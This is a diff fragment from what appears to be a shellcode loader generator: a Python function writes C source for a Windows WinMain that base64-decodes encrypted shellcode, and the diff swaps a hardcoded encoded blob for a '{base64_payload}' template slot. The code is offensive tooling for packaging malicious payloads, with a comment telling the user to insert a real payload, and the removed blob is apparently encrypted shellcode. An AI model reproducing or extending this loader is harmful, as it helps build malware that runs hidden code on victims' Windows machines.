@@ -188,7 +188,7 @@ def code_gen(option):
         int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {{
             // Encrypted Base64-encoded shellcode (Replace with your real payload)
             const char* base64_encoded_shellcode =
-                "VuMvSV5HcLGys/Xk9+fq6OzzjW/b90uTootPl96PQ5vqg0e/noffZpiZmeQfn+kZdue9odzzwKAjKumk5yYKBLiqvaVlvdB6sM+89CZ8eHH6+/y1ez90ZkoC1FWNTxBNgUssRA/f80da7N1UnSOQURvNUSzXVxHhjmLl7CtmKegSy1ncYix8FTp2DeRD72B9sXsYdD/vJgDJTwwBzQdUAEubDcZKxxhQghIMFA4JAQMbAx0EHwUo4o5DJTeZhzAoMzEk5nyGJ46NjCk8yAALSyVITn1+PtbIC2XMBGoniYmKwgVoxzOSkYPPVD3oEtnN0xJ40Rdu4Rvu1IKiWXLkIEDDrayur+nwCJo03rZIbenq9o10844AiT0DjEwEjzcJgkINjHQl3w4yLAGdXxCyyZuDkFQ8l2kYo1l9QJKGFzyiaiit7O/wuEqQmZH29/j5+rqsvK63ieNVVFNIN8diBFNKXO/yaddVNkcVFF6aXD0C3Rx1VpbGd3JidGR2Znhg1ettfWfQ+Hy78ni893aCQPYEusLrd3GTCryOzkgG8kHNViyym/Sg5PAFFe/wwuXEpY4U3pp3XGceaeSehhJt0i14HgIEbykw+6mLoA==";
+                "{base64_payload}";
 
             size_t encrypted_size;
             unsigned char* encrypted_shellcode = base64_decode(base64_encoded_shellcode, &encrypted_size);
